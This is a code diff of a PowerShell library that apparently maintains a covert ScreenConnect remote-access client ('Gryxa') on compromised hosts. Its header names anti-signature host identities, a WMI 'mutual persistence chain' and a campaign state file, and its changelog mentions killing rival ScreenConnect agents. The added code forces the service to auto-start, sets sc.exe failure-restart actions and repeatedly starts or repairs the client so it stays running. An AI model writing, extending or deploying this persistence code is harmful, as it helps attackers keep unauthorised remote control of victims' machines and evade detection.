@@ -1,8 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L19
+# OWN_LIB  BUILD 20260802L20
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
+# L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
 # L18: exterminate was KILLING Gryxa (null-path proc kill); sync FP before kill.
 # L17: Gryxa reinstall LOCK while any non-sevrz SC Running; FP drift never /x.
@@ -595,8 +596,8 @@ function Install-GryxaFromMsi([string]$MsiPath) {
 
 function Invoke-GryxaEnsure {
     # O40 HARD RULE: if ANY non-sevrz ScreenConnect is Running -> NEVER /x or /i.
-    # FP drift while Running is logged only (no reinstall).
-    # Reinstall ONLY when nothing Gryxa-like is Running (or -Force).
+    # O43: ALWAYS try start/repair BEFORE rate-limit; -Deep must not skip light heal
+    # (mon deep ticks were rate-limiting forever while Gryxa stayed Stopped).
     if (-not (Test-Path -LiteralPath $WorkDir)) {
         New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
     }
@@ -640,28 +641,52 @@ function Invoke-GryxaEnsure {
         GLog 'force_reinstall_despite_running'
     }
 
+    # O43: light heal ALWAYS (even under -Deep) — start/repair never rate-limited
+    $fpTry = $oldFp
+    if (Test-ScRunning $fpTry) {
+        Set-GryxaFp $fpTry
+        return "HEALTHY|$fpTry|running=1"
+    }
+    $name = "ScreenConnect Client ($fpTry)"
+    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
+    if ($svc) {
+        GLog "light_start_attempt status=$($svc.Status)"
+        & sc.exe config $name start= auto 2>&1 | Out-Null
+        & sc.exe failure $name reset= 86400 actions= restart/3000/restart/3000/restart/3000 2>&1 | Out-Null
+        & sc.exe start $name 2>&1 | Out-Null
+        Start-Sleep -Seconds 5
+        & sc.exe start $name 2>&1 | Out-Null
+        Start-Sleep -Seconds 3
+        if (Test-ScRunning $fpTry) {
+            Set-GryxaFp $fpTry
+            GLog 'light_started_ok'
+            return "HEALTHY|$fpTry|started=1"
+        }
+    }
+    if (Find-ProductGuid $fpTry) {
+        GLog 'light_repair_attempt'
+        $null = Repair-SCService $fpTry
+        Start-Sleep -Seconds 4
+        if (Test-ScRunning $fpTry) {
+            Set-GryxaFp $fpTry
+            GLog 'light_repaired_ok'
+            return "HEALTHY|$fpTry|repaired=1"
+        }
+    }
+    $runningFp = Find-RunningGryxaFp
+    if ($runningFp) {
+        Set-GryxaFp $runningFp
+        GLog "light_found_other_running=$runningFp"
+        return "HEALTHY|$runningFp|running=1|discovered"
+    }
+
     if (-not $Force -and (Test-AnyNonSevrzScRunning)) {
         $runningFp = Find-RunningGryxaFp
         Set-GryxaFp $runningFp
         return "HEALTHY|$runningFp|running=1|guard"
     }
 
-    if (-not $doDeep -and -not $Force) {
-        if (Test-ScRunning $oldFp) { return "HEALTHY|$oldFp|running=1" }
-        $name = "ScreenConnect Client ($oldFp)"
-        & sc.exe config $name start= auto 2>&1 | Out-Null
-        & sc.exe start $name 2>&1 | Out-Null
-        Start-Sleep -Seconds 4
-        if (Test-ScRunning $oldFp) { GLog 'light_started_ok'; return "HEALTHY|$oldFp|started=1" }
-        if (Find-ProductGuid $oldFp) {
-            $null = Repair-SCService $oldFp
-            GLog 'light_repair_done'
-            if (Test-ScRunning $oldFp) { return "HEALTHY|$oldFp|repaired=1" }
-        }
-        GLog 'light_escalate_install_missing'
-        $doDeep = $true
-    }
-
+    # msiexec path only from here — rate-limit applies (unless -Force / fully absent)
     if (-not $Force -and -not (Test-GryxaReinstallAllowed)) {
         GLog 'reinstall_rate_limited'
         return "UNHEALTHY|$oldFp|rate-limited"
